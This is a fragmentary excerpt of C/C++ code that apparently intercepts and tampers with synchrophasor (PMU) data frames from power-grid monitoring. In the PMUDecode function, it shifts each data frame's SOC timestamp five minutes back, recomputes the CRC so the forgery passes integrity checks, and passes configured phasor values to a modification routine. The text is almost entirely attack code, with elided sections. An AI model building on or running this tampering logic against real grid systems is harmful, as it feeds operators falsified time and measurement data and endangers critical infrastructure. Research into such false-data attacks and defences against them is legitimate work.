		...
		for(int index =0;index<config->numAlteredVal;index++)
			{
				...
				std::string normPMU = normalizeKey(PMUId);

				std::string Id = config->values_to_alter[index].identifier;
				std::string normId  = normalizeKey(Id);
				tempArray = normPMU + normId;
				
				// printf("Trying to match key: \"%s\"\n", tempArray.c_str());
...
static int extractConfig2Data(pmu_session_data_t *session,const uint8_t *data,int length, int *offsetOrg)
{
	...
	// Read CHNAM - phasors
		...
		for( int i = 0; i < pmuCfg->numPhasors; ++i ){
            ...
            std::string normStn = normalizeKey(pmuCfg->StationName);
	    std::string normCh  = normalizeKey(std::string(string));
	    tempString = normStn + normCh;
...
int PMUDecode(pmu_session_data_t *session,pmu_config_t *config,uint8_t *pdu_start, uint16_t pdu_length)
{
   ...
   // MY CODE
   case(DATA_FRAME):
	// modify SOC timestamp using this
        {
            uint32_t newSOC=session->SOC-300;   // change SOC(go 5 minutes back...)
            uint32_t newSOC_net=htonl(newSOC);

            // SOC starts at byte offset 6 of the PDU
            memcpy(pdu_start+6,&newSOC_net,4);

            // recompute CRC after modification
            unsigned short newcrc=CalcCrc16(pdu_start,pdu_length-2);
            newcrc=htons(newcrc);
            memcpy(pdu_start+pdu_length-2,&newcrc,2);

            printf("SOC modified from %u to %u\n", session->SOC, newSOC);
        }
        // modify PMU data by this
        if(session->capturedConfig2){
            if(modifyData(config, session, pdu_start, pdu_length))
            {
                printf("Got to Modify Data\n");
